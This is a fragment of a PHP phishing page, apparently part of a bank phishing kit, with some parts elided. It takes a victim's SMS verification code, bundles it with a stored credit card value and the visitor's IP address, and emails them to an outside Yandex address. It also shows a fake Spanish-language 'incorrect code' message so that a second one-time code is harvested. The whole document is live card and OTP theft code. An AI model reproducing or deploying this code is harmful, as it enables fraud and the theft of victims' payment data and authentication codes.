...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (is_numeric($_POST['sms2'])) {
		  ...
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            ...
            $message = "😪M4X1M1L1AN0😪 CC (2) :" . $_SESSION['cc2'] . "\nCodeSMS2 :" . $_POST['sms2'] ."\n" . $ip . "\n*****************************\n";
			$sms = $_POST['sms2'];
			$to = "mrh4x3r@yandex.com";
			$subject = "[AU] | CC (2) SMS (2) : $ip ---> $sms";
                            ...
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div id="Panel1" class="ogilvy-subtitular">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
<p><font color="red">CÓDIGO INCORRECTO</font></p>

                                            <span id="concepto" class="descripcionPago" style="font-weight:bold color="red"> </span><br><span
                                                    id="conceptovalor" style="font-weight:normal;">RECIBIRÁ UN NUEVO CÓDIGO SMS EN ALGUNOS SEGUNDOS, INGRESE EL CÓDIGO Y PRESIONE VALIDAR. </span>
                                        </div>
                                    </div>
...
<input type="text" name="sms2"  maxlength="8" class="input-res">
